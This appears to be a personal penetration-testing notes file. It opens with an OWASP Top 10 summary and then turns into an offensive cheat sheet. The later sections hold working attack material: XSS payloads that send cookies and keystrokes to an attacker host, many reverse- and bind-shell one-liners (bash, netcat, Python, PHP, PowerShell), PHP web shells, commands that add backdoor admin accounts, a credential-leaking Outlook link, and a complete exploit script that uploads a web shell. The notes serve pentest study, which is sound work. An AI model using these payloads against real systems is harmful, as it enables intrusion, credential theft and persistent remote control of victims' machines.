# Penetration Testing Tips


## OWASP Top 10

OWASP (Open Worldwide Application Security Project) is a non-profit organization dedicated to improve software security.  
They provide tools, resources and standards to help developers secure applications against vulnerabilities. 

OWASP maintains the OWASP Top 10 list of the critical security risks in web applications.  
The list is updated regularly to reflect emerging threats (latest updated in 2021).  

### 1 - Broken Access Control

Broken Access Control occurs when users can bypass authorization and access resources they should not be allowed to.  
- Insecure Direct Object Reference (IDOR) when the page of an object is accessible by parameter without proper permission validation
- admin endpoint which permissions is not checked

### 2 - Cryptographic Failures

Cryptographic failures is the misuse or absence of cryptographic algorithm to protect sensitive data.  
It can be a failure to protect data in transit or at rest.  
- outdated encryption algorithm
- hardcoded encryption keys
- storage of clear password in database instead of a hash
- file of a flat-file database (like sqlite3) unprotected, allowing download and use locally with full privilege 

### 3 - Injections

Injections occur when untrusted user input is interpreted as commands or parameters by the backend.  
It happens when the backend does not implement proper input validation (sanitization, parametrized queries...).  
- SQL injection : the attacker manipulates SQL queries, gaining potential control over the DB
- Command injection : the attacker executes system commands, allowing potential RCE

### 4 - Insecure Design

Insecure design are vulnerabilities inherent to the application's architecture.  
It results from a lack of secure design principles during the development phase.
- app without session expiry for sensitive actions
- missing OTP validation
- insecure password reset

### 5 - Security Misconfiguration

Security misconfiguration occurs when the system could have been secure with the right configuration, but was vulnerable due to poor configuration.  
It happens often with cloud infrastructure, when the configuration is not properly understood.
- incorrect permissions for S3 bucket
- Unnecessary services running on a machine
- default account with unchanged passwords
- error messages revealing internal info
- debugging interface still enabled in prod

### 6 - Vulnerable and Outdated Components

Some systems still use outdated components with known vulnerabilities, sometimes with exploits available on ExploitDB.  
For example, WordPress 4.6 has a known unauthenticated RCE vulnerability with available exploits.

### 7 - Identification and Authentication Failures

Identification and authentication failures occur when the authentication mechanism is flawed.  
Usually it uses a username/password verified by the server, and returns a session cookie.  

Typical flaws include :
- brute-force attacks if no lockout mechanism and no delay between attempts
- weak passwords if no strong password policy enforced
- weak session cookies if they are predictable and can be guessed by the attacker

### 8 - Software and Data Integrity Failures

Software and data integrity failures occur when an attacker manages to modify the software code or data.  
A common example is to get the victim to download a malicious installer or application patch.

Most application vendors publish various hashes for the files they offer in download.  
The integrity of the downloaded files should be checked by comparing the hash to the vendor-provided hash :
```shell
md5sum <FILE>
sha1sum <FILE>
sha256sum <FILE>
```

Javascript libraries can be included in the frontend code directly by a URL to the vendor's server :
```html
<script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
```

To prevent the users of our website to load malicious JS code, we can specify a hash along with the URL.  
This mechanism is called **Sub-Resource Integrity (SRI)**.  
The hash of a file at a given URL can be generated from `https://www.srihash.org`.  
```html
<script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-<HASH>"></script>
```

An example of data integrity failure is the invalid decryption of JWT tokens by some JWT libraries.  
A JWT contains 3 base64 parts : a header with the encryption algorithm, a payload and a signature encrypted with a secret key.  
If we alter the payload, we have no way to generate the correct signature without the server secret key.  
Some JWT libraries could be tricked by changing the `alg` value to `none` in the header, and modifying the payload.  
With this change, the libraries did not verify the signature, and accepted any payload as valid.

### 9 - Security Logging and Monitoring Failures

Every user action should be logged, so an attacker's activities can be traced when an incident happens.  
This is required to determine the risk and the impact of the attack.  
For each request, a web server should at least log the HTTP status, the timestamp, the username, the API endpoint and the IP address.  
These logs should be monitored to detect attacks and stop it or reduce their impact.

### 10 - Server-Side Request Forgery 

SSRF vulnerabilities occur when an attacker can coerce a web application to send specific requests to arbitrary destinations.  
This gives the attacker the permissions and trust of the victim web application.  

A common example of SSRF vulnerability is when a website uses a 3rd party service, and exposes it in a URL that the user can modify.  
If a web application includes the 3rd party server or IP in its request, the attacker can modify it to his own server.  
This way, the web application would send a request to the attacker server, exposing its secret API key for this 3rd party service.  
The attacker can simply listen to the incoming request to capture its content, for example with `nc -lvp 80`

SSRF vulnerabilities can allow the attacker to enumerate the internal network, abuse the trust relationship between servers,
and possibly get RCE on other machines in the internal network.


## SQLi (SQL Injection)

- `' OR 'a' = 'a` : test if there is a SQLi vulnerability
- `' UNION SELECT username FROM users WHERE 'a' = 'a` : display a field from another table
- `sqlite_master` (SQLite < 3.33.0) or `sqlite_schema` (SQLite >= 3.33.0) : built-in table containing all table names and definition in SQLite
- 

## XSS Attacks

### Payload

#### Proof of Concept

```html
<script>alert('XSS')</script>
```

#### Session stealing

Steal the session ID in `document.cookie` and send it to an API owned by the attacker.  
The `btoa(str)` JS function (Binary to ASCII) encodes the cookie in Base64.

```html
<script>fetch('https://attacker-domain.com/steal?cookie=' + btoa(document.cookie))</script>
```

#### Key logger

Similar to session stealing, but instead of a cookie send each keystroke to an API owned by the attacker.

```html
<script>document.onkeypress = function(e) { 
    fetch('https://attacker-domain.com/log?key=' + btoa(e.key));
}</script>
```

### Reflected XSS

Reflected XSS is a XSS vulnerability where a webpage displays in its HTML a string from the HTTP request
(for ex an URL parameter) without validation.  
This can happen for an error page for example, taking the error message as a parameter.  

Reflected XSS can be exploited by passing a custom script in the URL :
```
http://vulnerable-website.com?param=<script src="https://attacker-domain.com/payload.js"></script>
```

### Stored XSS

Stored XSS is a XSS vulnerability where the payload is stored by the website in a database (for example in a blog comment).  
It gets displayed for every user checking the website, so reaches more users than reflected XSS.  
However it is easier to detect than reflected XSS, since the payload is stored in the database.
 

### Blind XSS

Blind XSS is a XSS vulnerability where the attacker can inject a payload that is executed, but cannot test it himself.  
This happens for example if we create a support request which body is not sanitized, and this body is used as-is
to create a ticket in a ticketing system (JIRA, FreshDesk...).  
In that case, the payload should report to an HTTP API when executed, to transmit the stolen info.

**XSS Hunter Express** can be used to perform Blind XSS attacks, it will capture cookies, URL, page content...


## Directory Traversal

A directory traversal exposes files from the web server by exploiting a query parameters containing a file name.  
We can use the **dot-dot-attack** to expose files outside the intended resource folder.

#### Bypass a suffix appended to the file name by the web-server

A **NULL-byte injection** can by-pass a mechanism appending a suffix to the file name (like forcing an extension).  
The NULL byte is represented by `%00` or `0x00`.  
For example if a parameter `file=EN` returns the file `EN.php`, we can use `file=../../../../etc/passwd%00` to ignore the appended `.php`  
This NULL-byte injection is fixed in PHP 5.3.4.

#### Bypass the replacement of ../ by an empty string

If the sanitization replaces `../` by an empty string, it usually does a single pass.  
We can trick it by passing `....//....//etc/passwd`, after sanitization it will become `../../etc/passwd`.

#### LFI / RFI (Local/Remote File Injection)

When the web server can only return local files, it is a LFI.  
If the web server queries the URL of the input file, it is a RFI.  
In case of a RFI, we can force the web server to execute a malicious PHP file from a server owned by the attacker.  
This results in a RCE vulnerability.


## XXE Injection (XML External Entity Injection)

An XXE injection is an attack targeting websites taking advantage of the external entities feature of the XML language.  

XML supports external entities (XXE), which allow the content of an external file (local or remote) to be included inside an XML document.  
An entity called `ext` can be defined in the XML definition path with its location, and is referenced with `&ext;` in the XML body.

For example, a legitimate use of XXE could include an address from a file inside the XML object :
```xml
<!DOCTYPE people [
   <!ENTITY ext SYSTEM "http://example.com/address.txt">
]>
<people>
   <name>John</name>
   <address>&ext;</address>
   <email>john@example.com</email>
   <phone>080-1234-5678</phone>
</people>
```

An XXE injection consists in abusing this mechanism to reveal files on the machine that parses the XML object.  
For example, we could specify an XXE location of `/etc/passwd` so the content of that file is saved inside the XML object.  

XXE injection can be used even when we do not have control over the entire XML, for example when a user value gets embedded in an XML document.  
In that case, we cannot define an external entity, but we can use `XInclude` instead.

XXE is a dangerous feature that is usually not required in web applications.  
To protect against this attack, most XML parsers have the option to disable XXE, for example with `libxml_disable_entity_loader(true)` in PHP.  

XXE injections are often used to expose the content of a file on the target machine.  
They can also be used for SSRF (Server-Side Request Forgery) to force the target machine to send a specific request to another machine.


## Shells

A lot of reverse and bind shell examples for many languages are available on [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) and [PenTestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

### Reverse shell

A reverse shell is a connection initiated by the target machine to the local machine.  
This requires to have access to the target machine to force it to initiate this connection.  
Reverse shells are more difficult to detect by firewalls, since they look like legitimate traffic.  
When using a reverse shell, we need to setup our own network accessible from the target over the Internet.  

We can use `netcat` to listen for an incoming connection on the local machine.  
It can listen on any port, but the common ports (80, 443, 53, 139, 445) are often used to not raise suspicion.
```commandline
nc -lvnp 1234
```

Once we have a listening process locally, we can execute a payload to initiate the connection from the target machine.  
The payload command to use will depend on the available languages and command versions on the target machine.

Examples of reverse shell payload commands to connect to local machine `10.0.0.1` on port 1234 :
```shell
# Bash - using interactive bash linked to a TCP connection
bash -i >& /dev/tcp/10.0.0.1/1234 0>&1

# Bash - creating a file descriptor and a while loop executing commands from the TCP connection
exec 5<>/dev/tcp/10.0.0.1/1234; cat <&5 | while read line; do $line 2>&5 >&5; done 

# Netcat - with the -e parameter to connect to the local machine and start a shell
# the -e option is considered dangerous and often not allowed
nc -e /bin/sh 10.0.0.1 1234

# Netcat - without the -e option
# It creates a pipe with "mkfifo", a netcat process that writes to it, and a bash process that reads from it
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc 10.0.0.1 1234 >/tmp/f
mkfifo /tmp/f; nc 10.0.0.1 1234 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f           # alternative

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# PHP 
php -r '$sock=fsockopen("10.0.0.1",1234);system("sh <&3 >&3 2>&3");' 

# Busybox (bundle of tiny versions of many common UNIX utilities, including Netcat)
busybox nc 10.0.0.1 1234 -e sh

# PowerShell : one-liner that opens a reverse shell on a Windows machine by reaching out to a listener
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Bind Shell

Unlike a reverse shell, a bind shell is obtained when the target machine is listening, and the local machine connects to it.  
This is more likely to be detected, since the connection is initiated from outside the target machine's network.    
This is convenient if the target machine does not allow outgoing connections.

On the target machine, we also use a payload to expose a shell to clients connecting to it (port > 1024 to not need sudo permission).  
It is similar to the reverse shell payload, but this time it waits for an incoming connection instead of connecting to the target machine.
```shell
# on Linux
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
mkfifo /tmp/f; nc -lvnp 8080 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f                 # alternative

# using netcat on Windows
nc -l p 443 -e cmd.exe
```

The target machine then needs to connect to it to interact with the exposed bind shell :
```shell
nc -vn <TARGET_IP> 8080
```


### Web Shell

A web shell is a script uploaded to a web server that allows to send commands that the web server executes.  
A web shell is written in a language that the web server can execute, usually PHP, ASP, JSP or CGI.  
It can be uploaded to the web server by exploiting an unrestricted file upload vulnerability for example.  
Once uploaded to the web server, we just query its URL to have the web server execute arbitrary commands.  
As part of penetration testing, we can try to upload this file to the web server to gain access to it.

The below PHP scripts expose a very simple web shell that takes a `cmd` parameter and executes it :
```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```
```php
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```
Some publicly available PHP web shells can be used, like the [p0wny-shell](https://github.com/flozz/p0wny-shell) or the [c99 shell](https://www.r57shell.net/single.php?id=13).  


A webshell is often used to force the web server to run a command that connects to the attacker's listener to open a reverse shell.  
This means that the command we give to the webshell is a command from the reverse shell section (URL encoded).  

A useful example is to send to a Windows web server a command that runs powershell with a command opening a reverse-shell.  
That can be done by using the following URL-encoded command, and replacing the `<IP>` and `PORT>` placeholders with the listener's info.
```
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```

Kali also contains some web shells under `/usr/share/webshells`.  
It includes the PenTestMonkey [php-reverse-shell.php](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) that starts a reverse shell on the target machine when the PHP page is accessed.  
It requires the attacker to have setup a listener and updated the IP and PORT values in the PHP webshell.


### Shell stabilization

Most of the reverse and bind shells we get to access a remote machine are non-interactive.  
This means that they cannot run interactive commands requiring dynamic input from the user (like `ssh`).  

There are multiple was to stabilize a shell :

- **Python**  
  Python is almost always available on Linux machines, so we can use it to start a better Bash shell.  
  We can then set the `TERM` variable to `xterm` to allow to clear the screen, use arrows and interpret control characters.  
  Finally we can background the process, turn off the terminal echo (allow auto-complete and prevent Ctrl-C) and foreground it :
```shell
# start a listener on the attacker machine to receive a reverse shell
sudo nc -lvnp 443

# once we received a connection and got a non-interactive reverse shell, start a Bash shell with Python  
python -c 'import pty; pty.spawn("/bin/bash")'

# from the Bash shell, set the TERM variable
export TERM=xterm

# Ctr-Z to background the process
^Z

# set the terminal to prevent echo and transmit raw input, then foregroung the shell
stty raw -echo; fg
```
 

- **rlwrap**  
  `rlwrap` is a program that can wrap our NetCat listener command and provide history, auto-completion and arrow-keys support.  
  This works as well on reverse shells from Windows machines, that are much harder to stabilize than Unix machines.  
  On Linux, we can further stabilize it by backgrounding the shell and running `stty raw -echo; fg` as above.  
```shell
# wrap NetCat with rlwrap
sudo apt install rlwrap
rlwrap nc -lvnp 443
```


- **SoCat**  
  We can use the initial NetCat shell as a stepping stone to start a SoCat shell.  
  This is only efficient on Linux machines, because on Windows machine a SoCat shell is not more stable.  
  We can first transfer a compiled version of the `socat` binary to the target machine (with a local webserver for example).  
```shell
# from a different terminal window, start a local web server in the folder containing the socat binary
cd /usr/bin/
sudo python3 -m http.server 80

# from inside the NetCat reverse shell, download it
wget <ATTACKER_IP>/socat -O /tmp/socat
```

No matter which of the above technique we use, we can specify the number of rows and columns of our attacking terminal.  
This is required if we want to use text editors that overwrite the full screen (vim, nano...).  
```shell
# find the number of rows and columns in our terminal
stty -a

# from inside the reverse shell, set the number of rows and columns to the numbers shown by the above command
stty rows <ROW_COUNT>
stty cols <COL_COUNT>
```


### What next ?

Bind shells, reverse shells and web shells give a great entry point in the system, but are not very stable.  
Attackers usually use it to get more reliable access, with a user account.  

- SSH keys stored under `/home/<user>/.ssh` could be cracked to SSH into the  system as this user
- if we have admin privileges, we can create our own account in the system
  - on Linux :
  ```shell
  sudo adduser <USERNAME>             # it will prompt for a password
  sudo usermod -aG sudo <USERNAME>    # add the user to the sudoers
  ```
  - on Windows : 
  ```shell
  net user <USERNAME> <PASSWORD> /add
  net localgroup administrators <USERNAME> /add
  ```
- sometimes `/etc/shadow` and `/etc/passwd` are writable (CTF only)




## Run a local webserver

Run a local web server on port 8000 delivering files in its execution folder : 
```commandline
python -m http.server
```

This can be used if we have a shell on a target machine to download a file (like a payload) from the local machine.


## Special IP addresses 

**169.254.169.254** : link-local address used by cloud providers (AWS, GCP...) to provide metadata on the running instance.


## Famous CVEs

### Moniker Link (CVE-2024-21413 - score 9.8)

Moniker Link is a vulnerability in Outlook announced by Microsoft on 13/02/2024.  
An attacker can send a specific type of hyperlink (called a Moniker link) by email that bypasses Outlook's security mechanism.  
When clicked, Outlook sends the user's NTLM credentials to the attacker.

Outlook can render emails in HTML, and parse hyperlinks like HTTP or HTTPS.  
It can also open URLs specifying specific applications, called Moniker Links.  
Outlook has a security mechanism called **Protected View** that shows a warning popup when such an application tries to open.  
Protected View opens emails containing attachments and hyperlinks in Read-Only mode, to block this type of actions.  

One type of Moniker link is to use the `file://` prefix to open a file.  
It can specify a file on a network share controlled by the attacker, like : `<a href="file://ATTACKER_IP/myfile">Click me</a>`  
This uses the SMB protocol that involves local credentials for authentication.  
Protected View is able to block such attempt to steal the credentials.  

This CVE consists in a way to bypass the Protected View so it does not perform this validation, by using a `!` character after the file name.  
This can be done with a Moniker Link like : `<a href="file://ATTACKER_IP/myfile!exploit">Click me</a>`  
The share does not even need to exist on the attacker device, SMB still sends the netNTMLv2 hash to the attacker.  

The attacker needs to have a service running on his machine listening to incoming SMB messages.  
For example, the Responder Python tool can be used to receive the message and display the hash : `responder -I <INTERFACE>`

Microsoft patched Outlook to resolve this vulnerability in February 2024.  
A YARA rule has been created to detect these attack attempts, helping in malware detection and analysis and threat hunting.  


### Apache Log4j 2 RCE (CVE-2021-44228 - score 10.0)

Apache Log4j is an open-source logging framework for Java applications.   
It is used by many Java-based applications and libraries, such as Apache Struts, ElasticSearch, Logstash, Redis, Kafka...  
It has a critical vulnerability that allows an attacker to get an RCE on the LDAP server.  
If the attacker controls a logging message, he can force the server to download a payload to open a reverse shell.  
This vulnerability was very easy to exploit so it got exploited a lot, and massive hunting for vulnerable machines was started.


### EternalBlue (CVE-2017-0144 - score 8.8)

EternalBlue is a Windows exploit created by the NSA.  
It exploits a vulnerability in the SMBv1 protocol, that allows the attacker to execute arbitrary code and gain access on the target's network.  

The NSA did not disclose this vulnerability for 5 years, and it was revealed by the Shadows Broker group after they hacked the NSA.  
EternalBlue was used in the WannaCry software in 2017 to spread itself across a network and infect more devices.  
It was patched by Microsoft and listed in Microsoft's security bulletin as **MS17-010**.  

EternalBlue can be trivially exploited in Metasploit with the `exploit/windows/smb/ms17_010_eternalblue` exploit.


### RCE on IceCast 2.0.1 for Windows (CVE-2004-1561 - score 7.5)

IceCast is an open-source streaming media server software that runs on Unix-like and Windows OS, created in 1999 and still maintained today.  
Versions 2.0.1 and earlier are vulnerable to a buffer overflow attack allowing the attacker to execute arbitrary code.  

The attack is performed by sending an HTTP request with a large number of headers.  
Sending 32 headers causes a write past the end of a pointer array.  
On Linux, it does not seem to overwrite anything crucial, but on Windows it overwrites the saved instruction pointer.  

This vulnerability can be exploited in Metasploit with the `exploit/windows/http/icecast_header` exploit.  
This can offer a Meterpreter terminal with the user running IceCast (we need another attack to escalate privilege if needed).


### Unauthenticated file upload in PHPGurukul Online Bookstore 1.0 (CVE-2020-10224 - score 9.8)

This is not a very impactful CVE because its target is very specific, but it is a good example of a web-shell injection.  

The PHPGurukul Online Bookstore exposes a PHP page called `admin_add.php` for uploading an image.  
It can be used unauthenticated, and does not check the type of the uploaded file.  
This means we can upload a PHP file that executes commands on the web server as of the web server user.  

A public example of exploit is a Python script that uploads such a PHP web-shell, then uses it to offer a remote shell :
```python
import argparse
import random
import requests
import string
import sys

parser = argparse.ArgumentParser()
parser.add_argument('url', action='store', help='The URL of the target.')
args = parser.parse_args()

url = args.url.rstrip('/')
random_file = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(10))

payload = '<?php echo shell_exec($_GET[\'cmd\']); ?>'

file = {'image': (random_file + '.php', payload, 'text/php')}
print('> Attempting to upload PHP web shell...')
r = requests.post(url + '/admin_add.php', files=file, data={'add':'1'}, verify=False)
print('> Verifying shell upload...')
r = requests.get(url + '/bootstrap/img/' + random_file + '.php', params={'cmd':'echo ' + random_file}, verify=False)

if random_file in r.text:
    print('> Web shell uploaded to ' + url + '/bootstrap/img/' + random_file + '.php')
    print('> Example command usage: ' + url + '/bootstrap/img/' + random_file + '.php?cmd=whoami')
    launch_shell = str(input('> Do you wish to launch a shell here? (y/n): '))
    if launch_shell.lower() == 'y':
        while True:
            cmd = str(input('RCE $ '))
            if cmd == 'exit':
                sys.exit(0)
            r = requests.get(url + '/bootstrap/img/' + random_file + '.php', params={'cmd':cmd}, verify=False)
            print(r.text)
else:
    if r.status_code == 200:
        print('> Web shell uploaded to ' + url + '/bootstrap/img/' + random_file + '.php, however a simple command check failed to execute. Perhaps shell_exec is disabled? Try changing the payload.')
    else:
        print('> Web shell failed to upload! The web server may not have write permissions.')
```